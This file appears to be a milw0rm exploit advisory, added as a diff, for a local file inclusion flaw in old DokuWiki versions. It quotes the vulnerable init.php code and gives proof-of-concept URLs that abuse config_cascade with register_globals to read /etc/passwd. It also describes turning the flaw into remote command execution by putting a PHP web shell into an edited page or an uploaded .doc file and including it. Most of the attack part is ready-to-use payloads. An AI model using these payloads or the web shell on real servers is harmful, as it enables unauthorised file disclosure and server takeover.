@@ -1,0 +1,72 @@
+# Author_		girex
+# Homepage_		girex.altervista.org
+
+# CMS_			Dokuwiki
+# Homepage_		dokuwiki.org
+
+# Affected versions_	2009-02-14
+			rc2009-02-06
+			rc2009-01-30
+
+# Bug_			Local file inclusion
+# Need_			register_globals = On
+
+
+# Vuln description_
+# File:	/inc/init.php
+
+  // if available load a preload config file
+  $preload = fullpath(dirname(__FILE__)).'/preload.php';
+  if (@file_exists($preload)) include($preload);
+
+  ...
+
+  //set the configuration cascade - but only if its not already been set in preload.php
+  global $config_cascade;
+  if (empty($config_cascade)) {
+    $config_cascade = array(
+      'main' => array(
+        'default'   => array(DOKU_CONF.'dokuwiki.php'),
+        'local'     => array(DOKU_CONF.'local.php'),
+        'protected' => array(DOKU_CONF.'local.protected.php'),
+      ),
+  
+  ...
+
+  // load the global config file(s)
+  foreach (array('default','local','protected') as $config_group) {
+    if (empty($config_cascade['main'][$config_group])) continue;
+    foreach ($config_cascade['main'][$config_group] as $config_file) {
+      if (@file_exists($config_file)) {
+        include($config_file);
+      }
+    }
+  }
+
+
+# File preload.php doesn't exists. (so seems for the affected versions)
+# So we can set $config_cascade arrays via register globals
+# It's not a RFI couse use of file_exists function.
+
+# First of all you can check the dokuwiki's version here:
+# /[host]/[path]/VERSION
+# and check if it's a vulnerable version
+
+# PoC: [host]/[path]/doku.php?config_cascade[main][default][]=/etc/passwd
+# PoC: [host]/[path]/doku.php?config_cascade[main][default][]=./README
+
+# Note:
+# You can obtain a remote command execution if you can edit the content of a page
+# Just insert your php code into it like: <?php system($_GET[cmd]); ?>
+# And include it:
+
+# PoC: [host]/[path]/doku.php?config_cascade[main][default][]=./data/pages/[page_edited].txt
+
+# Or you can check if you have permissions to upload file via:
+# [host]/[path]/lib/exe/mediamanager.php
+
+# If so, upload your file with .doc extension then include it:
+
+# PoC: [host]/[path]/doku.php?config_cascade[main][default][]=./data/media/[uploaded_file].doc
+
+# milw0rm.com [2009-05-26]
